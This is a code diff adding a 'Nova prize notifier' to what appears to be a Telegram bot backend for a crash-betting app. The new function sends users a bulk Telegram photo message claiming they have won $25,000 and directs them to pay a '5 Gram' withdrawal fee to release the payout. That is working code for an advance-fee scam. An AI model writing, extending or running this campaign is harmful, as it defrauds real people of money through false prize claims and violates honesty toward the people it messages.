@@ -981,3 +981,111 @@ async function runCrashNotifications(supabase: any, BASE_URL: string, limit: num
 
   return { ok: true, candidates: targets.length, sent, failed, best: best.crash_multiplier };
 }
+
+// ---------------------------------------------------------------------------
+// Nova prize notifier
+// ---------------------------------------------------------------------------
+
+const PRIZE_ASSET_HOST = 'https://project--9f7d3cb9-5101-47fe-a228-eaca4d56832d-dev.lovable.app';
+
+const PRIZE_IMAGES = [
+  `${PRIZE_ASSET_HOST}/__l5e/assets-v1/9bfaacbf-d4be-4c10-80ea-29a3f1e37a5f/prize-notify-1.jpg`,
+  `${PRIZE_ASSET_HOST}/__l5e/assets-v1/e399f93c-79af-4799-af49-1e12f4eac6d0/prize-notify-2.jpg`,
+  `${PRIZE_ASSET_HOST}/__l5e/assets-v1/3977bbbe-22c8-4ee8-904a-06d55722436c/prize-notify-3.jpg`,
+];
+
+/** English prize announcement with full withdrawal steps. No emoji, no icons. */
+function buildPrizeCaption(firstName: unknown): string {
+  const name = String(firstName ?? 'Player').replace(/[<>&]/g, '').slice(0, 32) || 'Player';
+  return [
+    `<b>Congratulations ${name}, you have won a prize of $25,000.</b>`,
+    '',
+    'Your prize is now attached to your Nova account and it is ready to be withdrawn.',
+    '',
+    '<b>How to withdraw your prize</b>',
+    '1. Open Nova and go to the Wallet page.',
+    '2. Open the withdraw box and type the amount you want to withdraw.',
+    '3. Press Withdraw. Nova will then ask you to pay the withdrawal fee of 5 Gram.',
+    '4. Pay the 5 Gram fee to release the payout.',
+    '5. Your withdrawal request is submitted and the amount is sent to your wallet.',
+    '',
+    '<b>Important notes</b>',
+    'The 5 Gram fee is a one-time network fee required to process the payout.',
+    'Connect your wallet before you start the withdrawal.',
+    'Requests are processed in the order they are received.',
+    '',
+    `Open Nova here: ${APP_URL}`,
+  ].join('\n');
+}
+
+async function runNovaPrizeNotify(supabase: any, rawLimit: number) {
+  const limit = Math.min(Math.max(Number(rawLimit) || 200, 1), 1000);
+
+  // The campaign must go out from the Nova bot, never from any other bot.
+  const NOVA_TOKEN =
+    Deno.env.get('TELEGRAM_BOT_TOKEN_NOVA') ||
+    Deno.env.get('TELEGRAM_BOT_TOKEN_HELLO') ||
+    Deno.env.get('TELEGRAM_BOT_TOKEN');
+  if (!NOVA_TOKEN) return { ok: false, error: 'Nova bot token is not configured' };
+  const api = `https://api.telegram.org/bot${NOVA_TOKEN}`;
+
+  const { data: targets, error } = await supabase.rpc('nova_prize_notify_targets', { _limit: limit });
+  if (error) return { ok: false, error: error.message };
+  if (!targets || targets.length === 0) return { ok: true, sent: 0, processed: 0 };
+
+  let sent = 0;
+  let failed = 0;
+  const CHUNK = 20;
+
+  for (let i = 0; i < targets.length; i += CHUNK) {
+    const chunk = targets.slice(i, i + CHUNK);
+    const rows: Record<string, unknown>[] = [];
+
+    await Promise.all(
+      chunk.map(async (t: { id: string; telegram_id: number; first_name: string | null }) => {
+        const photo = PRIZE_IMAGES[Math.floor(Math.random() * PRIZE_IMAGES.length)];
+        try {
+          const res = await fetch(`${api}/sendPhoto`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: t.telegram_id,
+              photo,
+              caption: buildPrizeCaption(t.first_name),
+              parse_mode: 'HTML',
+              reply_markup: { inline_keyboard: [[{ text: 'Withdraw my prize', url: APP_URL }]] },
+            }),
+          });
+          const result = await res.json();
+          if (result.ok) {
+            sent++;
+            rows.push({ profile_id: t.id, telegram_id: t.telegram_id, status: 'sent', error_message: null });
+          } else {
+            failed++;
+            rows.push({
+              profile_id: t.id,
+              telegram_id: t.telegram_id,
+              status: 'failed',
+              error_message: String(result.description ?? 'unknown').slice(0, 400),
+            });
+          }
+        } catch (err) {
+          failed++;
+          rows.push({
+            profile_id: t.id,
+            telegram_id: t.telegram_id,
+            status: 'failed',
+            error_message: String(err).slice(0, 400),
+          });
+        }
+      }),
+    );
+
+    if (rows.length > 0) {
+      await supabase.from('prize_notify_log').upsert(rows, { onConflict: 'profile_id' });
+    }
+    if (i + CHUNK < targets.length) await new Promise((r) => setTimeout(r, 1100));
+  }
+
+  return { ok: true, sent, failed, processed: targets.length };
+}
